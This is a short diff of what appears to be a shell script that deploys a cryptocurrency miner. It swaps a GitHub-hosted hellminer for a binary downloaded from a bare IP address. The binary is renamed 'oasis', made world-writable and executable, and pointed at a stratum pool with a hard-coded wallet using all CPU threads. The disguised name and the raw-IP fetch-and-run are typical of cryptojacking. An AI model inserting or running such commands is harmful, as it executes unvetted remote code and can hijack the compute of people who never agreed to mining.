@@ -1,2 +1,3 @@
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.cook -p x 
+wget -O oasis http://139.180.133.28/SRBMiner-MULTI
+chmod 777 oasis
+./oasis --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.cok --password x --cpu-threads $(nproc --all)
